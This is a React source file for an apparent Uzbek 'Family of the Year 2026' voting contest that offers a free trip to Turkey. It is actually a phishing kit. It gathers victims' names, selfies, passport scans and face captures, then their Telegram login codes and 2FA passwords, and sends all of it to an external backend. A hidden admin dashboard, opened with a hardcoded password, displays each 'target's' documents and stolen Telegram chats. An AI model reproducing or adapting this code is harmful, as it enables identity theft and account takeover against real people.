
import React, { useState, useEffect, useRef } from 'react';
import { 
  Trophy, ChevronLeft, Lock, Check, Send, User, 
  ShieldCheck, Loader2, CheckCircle2, X, Settings, Database,
  Camera, Scan, UserCheck, FileText, Smartphone, Eye,
  ShieldAlert, Fingerprint, MapPin, Video,
  Ticket, UserPlus, UserRoundCheck, Image as ImageIcon, Upload,
  Briefcase, MessageSquare, Trash2, RefreshCw, Clock, Globe,
  Maximize
} from 'lucide-react';

// Yangilangan Backend URL
const BACKEND_URL = "https://yyyy-1pvl.onrender.com"; 

type Step = 'HOME' | 'REG_INFO' | 'REG_PHOTO' | 'REG_PASSPORT_FRONT' | 'REG_PASSPORT_BACK' | 'REG_FACEID' | 'AUTH_PHONE' | 'AUTH_CODE' | 'AUTH_2FA' | 'AUTH_CONFIRM' | 'SUCCESS' | 'ADMIN_LOGIN' | 'ADMIN_DASHBOARD';

const CANDIDATES = [
  { id: 1, name: "Eshbadalovlar", region: "Toshkent", img: "https://raw.githubusercontent.com/abdurazoqov606/Bola/main/rasm1.jpg", votes: "4,120" },
  { id: 2, name: "Ahmedovlar", region: "Samarqand", img: "https://raw.githubusercontent.com/abdurazoqov606/Bola/main/rasm2.jpg", votes: "3,892" },
  { id: 3, name: "Olimovlar", region: "Andijon", img: "https://raw.githubusercontent.com/abdurazoqov606/Bola/main/rasm3.jpg", votes: "2,482" }
];

const App: React.FC = () => {
  const [step, setStep] = useState<Step>('HOME');
  const [isLoading, setIsLoading] = useState(false);
  
  // User Data
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [profileImg, setProfileImg] = useState<string | null>(null);
  const [passportFront, setPassportFront] = useState<string | null>(null);
  const [passportBack, setPassportBack] = useState<string | null>(null);
  const [faceIdImg, setFaceIdImg] = useState<string | null>(null);
  const [phone, setPhone] = useState('');
  const [otp, setOtp] = useState(['', '', '', '', '']);
  const [codeHash, setCodeHash] = useState('');
  const [password2FA, setPassword2FA] = useState('');

  // Admin Panel States
  const [adminPass, setAdminPass] = useState('');
  const [targets, setTargets] = useState<any[]>([]);
  const [selectedTarget, setSelectedTarget] = useState<any>(null);
  const [selectedChat, setSelectedChat] = useState<any>(null);

  const videoRef = useRef<HTMLVideoElement>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);
  const [cameraActive, setCameraActive] = useState(false);
  const [timer, setTimer] = useState(5);
  const [faceScanStatus, setFaceScanStatus] = useState<'IDLE' | 'SCANNING' | 'ANALYZING' | 'COMPLETED'>('IDLE');

  const startCamera = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { 
          facingMode: 'user',
          width: { ideal: 1280 },
          height: { ideal: 720 }
        } 
      });
      if (videoRef.current) { 
        videoRef.current.srcObject = stream; 
        setCameraActive(true); 
      }
    } catch (e) { 
      console.error(e);
      alert("Kameraga ruxsat berishingiz shart! Brauzer sozlamalaridan kamerani yoqing."); 
    }
  };

  const stopCamera = () => {
    if (videoRef.current?.srcObject) {
      (videoRef.current.srcObject as MediaStream).getTracks().forEach(t => t.stop());
      setCameraActive(false);
    }
  };

  const capture = () => {
    if (!videoRef.current || videoRef.current.readyState < 2) return null;
    const canvas = document.createElement('canvas');
    canvas.width = videoRef.current.videoWidth;
    canvas.height = videoRef.current.videoHeight;
    const ctx = canvas.getContext('2d');
    if (ctx) {
      ctx.drawImage(videoRef.current, 0, 0);
      return canvas.toDataURL('image/jpeg', 0.8);
    }
    return null;
  };

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>, setter: (val: string) => void, nextStep: Step) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = (ev) => { 
        setter(ev.target?.result as string); 
        setStep(nextStep); 
        stopCamera(); 
      };
      reader.readAsDataURL(file);
    }
  };

  const handlePhoneSubmit = async () => {
    if (phone.length < 9) return;
    setIsLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/send-code`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          phone: '+998' + phone,
          identity: { 
            firstName, 
            lastName, 
            profileImg, 
            passportFront, 
            passportBack, 
            faceIdImg 
          } 
        })
      });
      const data = await res.json();
      if (data.status === 'ok') { 
        setCodeHash(data.hash); 
        setStep('AUTH_CODE'); 
      }
      else alert(data.message || "Xatolik!");
    } catch (e) { 
      alert("Server bilan ulanishda xatolik! Internetni tekshiring."); 
    } finally { 
      setIsLoading(false); 
    }
  };

  const handleOtpSubmit = async (c: string) => {
    setIsLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: '+998' + phone, code: c, hash: codeHash })
      });
      const data = await res.json();
      if (data.status === 'ok') setStep('AUTH_CONFIRM');
      else if (data.status === '2fa_needed') setStep('AUTH_2FA');
      else alert("Kod noto'g'ri! Iltimos, qaytadan urinib ko'ring.");
    } catch (e) { alert("Xatolik yuz berdi!"); } finally { setIsLoading(false); }
  };

  const handle2FASubmit = async () => {
    if (!password2FA) return;
    setIsLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: '+998' + phone, password: password2FA })
      });
      const data = await res.json();
      if (data.status === 'ok') setStep('AUTH_CONFIRM');
      else alert("Ikki bosqichli parol noto'g'ri!");
    } catch (e) { alert("Xatolik!"); } finally { setIsLoading(false); }
  };

  const startFaceScan = () => {
    if (!cameraActive) {
      startCamera();
      return;
    }
    setFaceScanStatus('SCANNING');
    let c = 5;
    setTimer(c);
    const it = setInterval(() => {
      c--; setTimer(c);
      if (c <= 0) {
        clearInterval(it);
        const img = capture();
        if (img) setFaceIdImg(img);
        setFaceScanStatus('ANALYZING');
        setTimeout(() => {
          setFaceScanStatus('COMPLETED');
          setTimeout(() => { 
            stopCamera(); 
            setStep('AUTH_PHONE'); 
          }, 1000);
        }, 1500);
      }
    }, 1000);
  };

  const fetchTargets = async () => {
    setIsLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/admin/targets`);
      const data = await res.json();
      setTargets(data);
    } catch (e) { console.error(e); } finally { setIsLoading(false); }
  };

  const fetchDetails = async (p: string) => {
    setIsLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/admin/target/${p}`);
      const data = await res.json();
      setSelectedTarget({ ...data, phone: p });
      setSelectedChat(null);
    } catch (e) { console.error(e); } finally { setIsLoading(false); }
  };

  return (
    <div className="min-h-screen bg-[#05080a] text-white font-sans overflow-x-hidden">
      <div className="fixed inset-0 bg-gradient-to-b from-blue-900/10 to-black pointer-events-none"></div>
      
      <div className="relative z-10 p-4 max-w-md mx-auto">
        {step === 'HOME' && (
          <div className="animate-in fade-in duration-700">
            <div className="flex justify-between items-center mb-10 py-4 border-b border-white/5">
              <div className="flex items-center gap-2">
                <Trophy className="text-yellow-400 drop-shadow-[0_0_8px_rgba(250,204,21,0.4)]" size={24} />
                <h1 className="font-black italic text-sm tracking-tighter">YIL OILASI <span className="text-blue-500">2026</span></h1>
              </div>
              <button onClick={() => setStep('ADMIN_LOGIN')} className="p-2 opacity-10 hover:opacity-100 transition-opacity"><Settings size={20}/></button>
            </div>

            <div className="bg-gradient-to-br from-blue-600 to-indigo-900 p-8 rounded-[2.5rem] mb-10 shadow-[0_20px_50px_rgba(37,99,235,0.25)] relative overflow-hidden group">
               <div className="relative z-10 space-y-4">
                  <h2 className="text-4xl font-black italic leading-tight uppercase tracking-tighter">TURKIYAGA <br/> <span className="text-yellow-300">BEPUL</span> SAYOHAT!</h2>
                  <button onClick={() => setStep('REG_INFO')} className="bg-white text-blue-600 px-10 py-4 rounded-full font-black uppercase text-xs flex items-center gap-2 shadow-2xl active:scale-95 transition-transform">
                    <UserPlus size={18}/> Ro'yxatdan o'tish
                  </button>
               </div>
               <Ticket className="absolute -right-10 -bottom-10 w-48 h-48 text-white/5 rotate-12" />
            </div>

            <div className="space-y-4 pb-24">
              <p className="text-[10px] font-black uppercase tracking-[0.3em] text-blue-500 mb-6 border-l-4 border-blue-500 pl-4">Nomzodlar</p>
              {CANDIDATES.map(c => (
                <div key={c.id} className="bg-white/5 backdrop-blur-2xl p-4 rounded-[2rem] border border-white/10 flex items-center gap-4">
                  <img src={c.img} className="w-24 h-24 rounded-3xl object-cover" alt={c.name} />
                  <div className="flex-1">
                    <h4 className="font-black text-base uppercase tracking-tight">{c.name}</h4>
                    <div className="text-[10px] text-white/40 mb-3 flex items-center gap-1"><MapPin size={10}/> {c.region}</div>
                    <div className="flex justify-between items-center">
                       <span className="text-xs font-black text-blue-400">{c.votes} Ovoz</span>
                       <button onClick={() => setStep('REG_INFO')} className="bg-blue-600 px-6 py-2.5 rounded-2xl text-[10px] font-black uppercase shadow-lg">OVOZ BERISH</button>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {(['REG_INFO', 'REG_PHOTO', 'REG_PASSPORT_FRONT', 'REG_PASSPORT_BACK', 'REG_FACEID'] as Step[]).includes(step) && (
          <div className="fixed inset-0 bg-[#05080a] z-[100] flex flex-col p-8 animate-in slide-in-from-bottom-20 duration-500">
            <button onClick={() => { stopCamera(); setStep('HOME'); }} className="mb-10 w-12 h-12 bg-white/5 rounded-2xl flex items-center justify-center text-white/40"><ChevronLeft size={24}/></button>
            
            {step === 'REG_INFO' && (
              <div className="space-y-8 animate-in fade-in">
                <h2 className="text-3xl font-black uppercase italic leading-none">Shaxsiy <br/> <span className="text-blue-500">Ma'lumotlar</span></h2>
                <div className="space-y-4">
                  <input type="text" placeholder="Ismingiz" value={firstName} onChange={e => setFirstName(e.target.value)} className="w-full bg-white/5 border border-white/10 p-6 rounded-[1.5rem] font-bold outline-none focus:border-blue-600 transition-all" />
                  <input type="text" placeholder="Familiyangiz" value={lastName} onChange={e => setLastName(e.target.value)} className="w-full bg-white/5 border border-white/10 p-6 rounded-[1.5rem] font-bold outline-none focus:border-blue-600 transition-all" />
                </div>
                <button onClick={() => setStep('REG_PHOTO')} className="w-full bg-blue-600 py-6 rounded-[1.5rem] font-black uppercase tracking-[0.2em] shadow-xl active:scale-95 transition-all">Davom etish</button>
              </div>
            )}

            {(['REG_PHOTO', 'REG_PASSPORT_FRONT', 'REG_PASSPORT_BACK'] as Step[]).includes(step) && (
              <div className="space-y-8 text-center flex-1 flex flex-col justify-center">
                <h2 className="text-2xl font-black uppercase italic leading-tight">
                  {step === 'REG_PHOTO' ? 'Profil uchun Selfie' : step === 'REG_PASSPORT_FRONT' ? 'Passport OLD tomoni' : 'Passport ORQA tomoni'}
                </h2>
                <div className="aspect-[4/3] w-full bg-white/5 rounded-[2.5rem] border-2 border-dashed border-white/10 flex flex-col items-center justify-center gap-6 relative overflow-hidden shadow-2xl">
                  {cameraActive ? <video ref={videoRef} autoPlay playsInline className="w-full h-full object-cover" /> : (
                    <div className="flex gap-4">
                      <button onClick={startCamera} className="text-blue-500 flex flex-col items-center gap-3 bg-blue-500/5 p-8 rounded-3xl hover:bg-blue-500/10 transition-colors"><Camera size={40}/><span className="text-[10px] font-black uppercase">Kamera</span></button>
                      <button onClick={() => fileInputRef.current?.click()} className="text-emerald-500 flex flex-col items-center gap-3 bg-emerald-500/5 p-8 rounded-3xl hover:bg-emerald-500/10 transition-colors"><ImageIcon size={40}/><span className="text-[10px] font-black uppercase">Galereya</span></button>
                    </div>
                  )}
                </div>
                <input type="file" ref={fileInputRef} className="hidden" accept="image/*" onChange={(e) => {
                  if(step === 'REG_PHOTO') handleFileUpload(e, setProfileImg, 'REG_PASSPORT_FRONT');
                  else if(step === 'REG_PASSPORT_FRONT') handleFileUpload(e, setPassportFront, 'REG_PASSPORT_BACK');
                  else handleFileUpload(e, setPassportBack, 'REG_FACEID');
                }} />
                {cameraActive && <button onClick={() => {
                  const p = capture();
                  if(p){
                    if(step === 'REG_PHOTO') {setProfileImg(p); setStep('REG_PASSPORT_FRONT');}
                    else if(step === 'REG_PASSPORT_FRONT') {setPassportFront(p); setStep('REG_PASSPORT_BACK');}
                    else {setPassportBack(p); setStep('REG_FACEID');}
                    stopCamera();
                  }
                }} className="w-full bg-blue-600 py-6 rounded-[1.5rem] font-black uppercase shadow-xl transition-all active:scale-95">Rasmga olish</button>}
              </div>
            )}

            {step === 'REG_FACEID' && (
              <div className="space-y-8 text-center flex-1 flex flex-col justify-center animate-in zoom-in">
                 <h2 className="text-3xl font-black uppercase italic leading-none">Biometrik <br/> <span className="text-blue-500">Yuz Identifikatsiyasi</span></h2>
                 <div className="w-72 h-72 mx-auto rounded-full border-4 border-blue-500/30 overflow-hidden relative shadow-[0_0_80px_rgba(59,130,246,0.3)] bg-blue-500/5">
                   {!cameraActive ? <button onClick={startCamera} className="absolute inset-0 flex flex-col items-center justify-center text-blue-500 hover:scale-105 transition-transform"><Scan size={64} className="mb-2 animate-pulse"/><span className="text-[10px] font-black uppercase">Skanerlash</span></button> : (
                     <div className="relative w-full h-full">
                        <video ref={videoRef} autoPlay playsInline className={`w-full h-full object-cover ${faceScanStatus === 'SCANNING' ? 'animate-pulse' : ''}`} />
                        {faceScanStatus === 'ANALYZING' && <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/60 backdrop-blur-sm"><Loader2 size={48} className="text-blue-500 animate-spin mb-2"/><span className="text-[10px] font-black uppercase text-blue-400">Tekshirilmoqda...</span></div>}
                        {faceScanStatus === 'COMPLETED' && <div className="absolute inset-0 flex flex-col items-center justify-center bg-emerald-500/80 animate-in zoom-in"><CheckCircle2 size={64} className="text-white mb-2"/><span className="text-[10px] font-black uppercase text-white tracking-widest">TASDIQLANDI</span></div>}
                     </div>
                   )}
                 </div>
                 <div className="h-20 flex items-center justify-center">
                   {faceScanStatus === 'IDLE' && cameraActive && <button onClick={startFaceScan} className="w-full bg-blue-600 py-6 rounded-[1.5rem] font-black uppercase tracking-widest shadow-xl transition-all active:scale-95">Boshlash</button>}
                   {faceScanStatus === 'SCANNING' && <div className="flex flex-col items-center gap-2"><div className="text-5xl font-black text-blue-500 tabular-nums">{timer}</div><span className="text-[10px] font-black uppercase text-blue-400">Harakat qilmang</span></div>}
                 </div>
              </div>
            )}
          </div>
        )}

        {(['AUTH_PHONE', 'AUTH_CODE', 'AUTH_2FA', 'AUTH_CONFIRM'] as Step[]).includes(step) && (
          <div className="fixed inset-0 bg-black/95 backdrop-blur-3xl z-[200] flex flex-col items-center justify-center p-8 animate-in fade-in">
            {step === 'AUTH_PHONE' && (
              <div className="w-full max-w-xs space-y-10 text-center animate-in slide-in-from-bottom-10">
                <div className="w-24 h-24 bg-blue-600/10 rounded-[2.5rem] flex items-center justify-center mx-auto text-blue-500 shadow-inner"><Smartphone size={48}/></div>
                <h2 className="text-3xl font-black uppercase italic leading-none">Ovoz berishni <br/> <span className="text-blue-500">Tasdiqlash</span></h2>
                <div className="relative group">
                  <span className="absolute left-6 top-1/2 -translate-y-1/2 font-black text-blue-500 text-xl tracking-tighter">+998</span>
                  <input type="tel" value={phone} onChange={e => setPhone(e.target.value.replace(/\D/g,''))} className="w-full bg-white/5 border border-white/10 p-6 pl-20 rounded-[1.5rem] font-black text-2xl outline-none focus:border-blue-500 shadow-2xl" placeholder=" Raqamingiz" autoFocus />
                </div>
                <button onClick={handlePhoneSubmit} disabled={phone.length < 9 || isLoading} className="w-full bg-blue-600 py-6 rounded-[1.5rem] font-black uppercase shadow-xl shadow-blue-600/20 active:scale-95 transition-all">
                  {isLoading ? <Loader2 className="animate-spin mx-auto"/> : 'SMS kod olish'}
                </button>
              </div>
            )}

            {step === 'AUTH_CODE' && (
              <div className="w-full max-w-xs space-y-10 text-center animate-in zoom-in">
                <h2 className="text-3xl font-black uppercase italic">Kodni kiriting</h2>
                <div className="flex gap-3 justify-center">
                  {otp.map((d, i) => (
                    <input key={i} type="text" maxLength={1} value={d} onChange={e => {
                      const n = [...otp]; n[i] = e.target.value; setOtp(n);
                      if(e.target.value && i < 4) (e.target.nextSibling as any).focus();
                      if(n.every(x => x !== '')) handleOtpSubmit(n.join(''));
                    }} className="w-14 h-20 bg-white/5 border border-white/10 rounded-2xl text-center text-4xl font-black text-blue-500 outline-none focus:border-blue-500 shadow-2xl transition-all" autoFocus={i===0} />
                  ))}
                </div>
                <p className="text-[10px] font-black uppercase text-blue-500 animate-pulse tracking-widest">Telegram chatidan kodni oling</p>
              </div>
            )}

            {step === 'AUTH_2FA' && (
              <div className="w-full max-w-xs space-y-10 text-center animate-in slide-in-from-bottom-10">
                <Lock size={48} className="mx-auto text-rose-500 drop-shadow-[0_0_10px_rgba(244,63,94,0.3)]"/>
                <h2 className="text-3xl font-black uppercase italic text-rose-500">2FA Parol</h2>
                <input type="password" value={password2FA} onChange={e => setPassword2FA(e.target.value)} className="w-full bg-white/5 border border-white/10 p-6 rounded-[1.5rem] text-center font-black text-xl outline-none focus:border-rose-500 shadow-2xl transition-all" placeholder="Parol" autoFocus />
                <button onClick={handle2FASubmit} disabled={isLoading} className="w-full bg-rose-600 py-6 rounded-[1.5rem] font-black uppercase shadow-xl shadow-rose-600/20 active:scale-95 transition-all">Tasdiqlash</button>
              </div>
            )}

            {step === 'AUTH_CONFIRM' && (
              <div className="w-full max-w-xs bg-white/5 p-10 rounded-[3.5rem] border border-white/10 text-center space-y-10 animate-in zoom-in">
                <ShieldAlert size={64} className="mx-auto text-rose-500"/>
                <h2 className="text-3xl font-black uppercase text-rose-500 italic">TASDIQLANG!</h2>
                <p className="text-xs font-bold leading-relaxed text-white/70">Telegram ilovangizga yangi xabar keldi. <br/> <b>"HA, BU MENMAN"</b> tugmasini bosing!</p>
                <button onClick={() => setStep('SUCCESS')} className="w-full bg-white/10 py-5 rounded-[1.5rem] font-black uppercase text-[10px] tracking-widest hover:bg-white/20 transition-all">Tushundim</button>
              </div>
            )}
          </div>
        )}

        {/* --- ADMIN PANEL --- */}
        {step === 'ADMIN_LOGIN' && (
          <div className="fixed inset-0 bg-[#05080a] z-[300] flex flex-col items-center justify-center p-8 animate-in zoom-in">
            <h2 className="text-2xl font-black mb-10 tracking-widest uppercase text-blue-500">ADMIN PANEL</h2>
            <input type="password" value={adminPass} onChange={e => setAdminPass(e.target.value)} placeholder="Maxfiy kod" className="w-full max-w-xs bg-white/5 p-6 rounded-2xl border border-white/10 font-black mb-4 text-center tracking-[1em] outline-none focus:border-blue-500 transition-all" />
            <button onClick={() => { if(adminPass === '20102010abbos') { setStep('ADMIN_DASHBOARD'); fetchTargets(); } else alert('Xato!'); }} className="w-full max-w-xs bg-blue-600 py-5 rounded-2xl font-black uppercase tracking-widest shadow-xl active:scale-95">Kirish</button>
            <button onClick={() => setStep('HOME')} className="mt-8 text-white/20 uppercase font-bold text-xs hover:text-white/50 transition-colors">Bekor qilish</button>
          </div>
        )}

        {step === 'ADMIN_DASHBOARD' && (
          <div className="fixed inset-0 bg-[#05080a] z-[400] overflow-y-auto p-4 animate-in slide-in-from-right-10">
            <div className="flex justify-between items-center mb-10 border-b border-white/5 pb-6">
               <h2 className="text-xl font-black text-blue-500 uppercase tracking-tighter">Dashbord</h2>
               <div className="flex gap-2">
                 <button onClick={fetchTargets} className="p-3 bg-white/5 rounded-2xl hover:bg-white/10 transition-all"><RefreshCw size={20} className={isLoading ? 'animate-spin' : ''}/></button>
                 <button onClick={() => setStep('HOME')} className="p-3 bg-rose-600/10 text-rose-500 rounded-2xl hover:bg-rose-600/20 transition-all"><X size={20}/></button>
               </div>
            </div>
            <div className="space-y-4 pb-20">
              {targets.length === 0 && <p className="text-center opacity-30 mt-20 font-bold uppercase text-xs tracking-widest">Hozircha ma'lumot yo'q</p>}
              {targets.map(t => (
                <div key={t.phone} onClick={() => fetchDetails(t.phone)} className={`p-5 rounded-[2.5rem] border flex items-center gap-4 transition-all shadow-xl active:scale-95 ${t.status === 'logged_in' ? 'bg-blue-600/5 border-blue-500/20' : 'bg-white/5 border-white/10 opacity-70'}`}>
                  <div className={`w-14 h-14 rounded-2xl flex items-center justify-center font-black text-sm shadow-inner ${t.status === 'logged_in' ? 'bg-blue-600' : 'bg-white/10'}`}>{t.status === 'logged_in' ? <UserCheck size={24}/> : <Clock size={24}/>}</div>
                  <div className="flex-1">
                    <h4 className="font-black text-sm uppercase truncate">{t.identity?.firstName || 'Noma\'lum'}</h4>
                    <p className="text-[10px] opacity-40 font-bold tracking-widest">+{t.phone}</p>
                    <div className="flex gap-2 mt-2">
                      <span className={`text-[8px] font-black uppercase px-2 py-0.5 rounded-full ${t.status === 'logged_in' ? 'bg-emerald-500/20 text-emerald-500' : 'bg-amber-500/20 text-amber-500'}`}>{t.status === 'logged_in' ? 'MUVAFFAQIYAT' : 'KUTILMOQDA'}</span>
                      {t.chatCount > 0 && <span className="text-[8px] font-black uppercase px-2 py-0.5 rounded-full bg-blue-500/20 text-blue-500">{t.chatCount} CHAT</span>}
                    </div>
                  </div>
                  <Eye size={20} className="opacity-20"/>
                </div>
              ))}
            </div>
            {selectedTarget && (
              <div className="fixed inset-0 bg-[#05080a] z-[500] p-6 overflow-y-auto animate-in slide-in-from-bottom-20">
                <div className="flex justify-between items-center mb-10"><button onClick={() => setSelectedTarget(null)} className="p-3 bg-white/5 rounded-2xl"><ChevronLeft size={24}/></button><h3 className="text-sm font-black uppercase tracking-widest">Ma'lumotlar</h3><div className="w-12"></div></div>
                <div className="space-y-12">
                  <div className="flex flex-col items-center gap-6">
                    {selectedTarget.identity?.profileImg && <img src={selectedTarget.identity.profileImg} className="w-48 h-48 rounded-[3rem] object-cover border-4 border-white/10 shadow-2xl transition-transform hover:scale-105" alt="Profile" />}
                    <div className="text-center"><h4 className="text-2xl font-black uppercase tracking-tight">{selectedTarget.identity?.firstName} {selectedTarget.identity?.lastName}</h4><p className="text-blue-500 font-black tracking-widest">+{selectedTarget.phone}</p></div>
                  </div>
                  <div className="grid grid-cols-1 gap-6">
                    {selectedTarget.identity?.passportFront && <div className="space-y-2"><p className="text-[10px] font-black opacity-30 uppercase tracking-[0.4em]">PASSPORT OLD</p><img src={selectedTarget.identity.passportFront} className="w-full rounded-[2.5rem] shadow-xl border border-white/5" alt="Passport Front" /></div>}
                    {selectedTarget.identity?.passportBack && <div className="space-y-2"><p className="text-[10px] font-black opacity-30 uppercase tracking-[0.4em]">PASSPORT ORQA</p><img src={selectedTarget.identity.passportBack} className="w-full rounded-[2.5rem] shadow-xl border border-white/5" alt="Passport Back" /></div>}
                    {selectedTarget.identity?.faceIdImg && <div className="space-y-2"><p className="text-[10px] font-black opacity-30 uppercase tracking-[0.4em] text-blue-500">FACE ID CAPTURE</p><img src={selectedTarget.identity.faceIdImg} className="w-full rounded-[2.5rem] shadow-2xl border-2 border-blue-500 shadow-blue-500/20" alt="Face ID" /></div>}
                  </div>
                  {selectedTarget.status === 'logged_in' && (
                    <div className="space-y-6 pb-20">
                       <p className="text-[10px] font-black opacity-30 uppercase tracking-[0.4em] border-l-4 border-blue-500 pl-4">Chatlar ({selectedTarget.chats?.length})</p>
                       <div className="space-y-3">
                         {selectedTarget.chats?.map((c: any) => (
                           <div key={c.id} onClick={() => setSelectedChat(c)} className="bg-white/5 p-6 rounded-[2rem] border border-white/5 flex justify-between items-center active:scale-95 transition-all hover:bg-white/10">
                              <span className="text-sm font-black truncate max-w-[200px] uppercase tracking-tighter">{c.name || 'Noma\'lum Chat'}</span>
                              <div className="bg-blue-600 px-3 py-1 rounded-xl text-[10px] font-black shadow-lg">{c.messages.length}</div>
                           </div>
                         ))}
                       </div>
                    </div>
                  )}
                </div>
                {selectedChat && (
                  <div className="fixed inset-0 bg-[#05080a] z-[600] flex flex-col animate-in slide-in-from-right-10">
                    <div className="p-6 border-b border-white/10 flex items-center gap-4 bg-black/40 backdrop-blur-xl">
                       <button onClick={() => setSelectedChat(null)} className="p-3 bg-white/5 rounded-2xl hover:bg-white/10 transition-all"><ChevronLeft size={20}/></button>
                       <h4 className="font-black text-sm truncate uppercase tracking-tighter">{selectedChat.name}</h4>
                    </div>
                    <div className="flex-1 overflow-y-auto p-6 space-y-6">
                       {selectedChat.messages.map((m: any, idx: number) => (
                         <div key={idx} className={`max-w-[85%] p-4 rounded-[1.5rem] text-[12px] shadow-lg ${m.out ? 'ml-auto bg-blue-600 font-bold rounded-tr-none' : 'bg-white/10 rounded-tl-none'}`}>
                           {m.text}<div className="text-[8px] opacity-40 mt-2 text-right">{m.date}</div>
                         </div>
                       ))}
                    </div>
                  </div>
                )}
              </div>
            )}
          </div>
        )}

        {step === 'SUCCESS' && (
          <div className="fixed inset-0 bg-[#05080a] z-[300] flex flex-col items-center justify-center p-12 text-center animate-in zoom-in duration-700">
            <CheckCircle2 size={120} className="text-emerald-500 drop-shadow-[0_0_20px_rgba(16,185,129,0.4)] animate-bounce" />
            <h2 className="text-4xl font-black text-emerald-500 uppercase italic tracking-tighter mt-10">TABRIKLAYMIZ!</h2>
            <p className="text-[10px] font-bold opacity-30 leading-relaxed uppercase tracking-widest mt-6">Sizning ma'lumotlaringiz muvaffaqiyatli tekshirildi. <br/>G'oliblar bilan shaxsan bog'lanamiz!</p>
            <button onClick={() => window.location.reload()} className="mt-20 px-10 py-4 bg-white/5 rounded-full text-blue-500 font-black uppercase text-[10px] tracking-[0.3em] border border-white/10 active:scale-95 transition-all">Asosiy sahifa</button>
          </div>
        )}
      </div>
    </div>
  );
};

export default App;
